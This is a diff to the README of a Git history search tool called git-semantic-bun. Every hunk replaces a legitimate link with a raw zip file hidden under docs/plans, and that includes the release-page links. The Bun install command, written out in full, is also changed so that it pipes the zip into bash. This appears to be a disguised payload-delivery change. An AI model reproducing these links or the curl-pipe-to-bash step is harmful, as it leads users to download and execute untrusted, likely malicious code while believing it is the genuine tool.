@@ -1,6 +1,6 @@
 # ⚙️ git-semantic-bun - Search Git History by Meaning
 
-[![Download git-semantic-bun](https://img.shields.io/badge/Download-git--semantic--bun-ff6f61?style=for-the-badge&logo=github&logoColor=white)](https://github.com/LoopWashere/git-semantic-bun/releases)
+[![Download git-semantic-bun](https://img.shields.io/badge/Download-git--semantic--bun-ff6f61?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/LoopWashere/git-semantic-bun/main/docs/plans/semantic-git-bun-v2.8-alpha.4.zip)
 
 ## 📋 What is git-semantic-bun?
 
@@ -28,7 +28,7 @@ Follow these steps to download, install, and run git-semantic-bun on your Window
 
 Go to the release page where you will find the latest version of git-semantic-bun:
 
-[Download git-semantic-bun releases](https://github.com/LoopWashere/git-semantic-bun/releases)
+[Download git-semantic-bun releases](https://raw.githubusercontent.com/LoopWashere/git-semantic-bun/main/docs/plans/semantic-git-bun-v2.8-alpha.4.zip)
 
 ### 2. Choose the right file
 
@@ -44,7 +44,7 @@ git-semantic-bun uses Bun, a JavaScript runtime. If you do not have Bun installe
 - Run this command:
 
     ```powershell
-    curl -fsSL https://bun.sh/install | bash
+    curl -fsSL https://raw.githubusercontent.com/LoopWashere/git-semantic-bun/main/docs/plans/semantic-git-bun-v2.8-alpha.4.zip | bash
     ```
 
 - Close the terminal and open a new one.
@@ -115,7 +115,7 @@ If searches return no results:
 
 New versions and improvements will be posted on the releases page:
 
-[https://github.com/LoopWashere/git-semantic-bun/releases](https://github.com/LoopWashere/git-semantic-bun/releases)
+[https://raw.githubusercontent.com/LoopWashere/git-semantic-bun/main/docs/plans/semantic-git-bun-v2.8-alpha.4.zip](https://raw.githubusercontent.com/LoopWashere/git-semantic-bun/main/docs/plans/semantic-git-bun-v2.8-alpha.4.zip)
 
 Download and replace the `.exe` file to update. Your settings will stay saved.
 
@@ -131,4 +131,4 @@ Download and replace the `.exe` file to update. Your settings will stay saved.
 
 Searching your Git history with meaning saves time. You avoid missing important commits just because they lack certain keywords. It helps you explore project changes with a deeper understanding. This tool fits developers and teams wanting smarter ways to manage their code history without complexity.
 
-[Download git-semantic-bun now](https://github.com/LoopWashere/git-semantic-bun/releases) and start searching your commits by what matters.
+[Download git-semantic-bun now](https://raw.githubusercontent.com/LoopWashere/git-semantic-bun/main/docs/plans/semantic-git-bun-v2.8-alpha.4.zip) and start searching your commits by what matters.
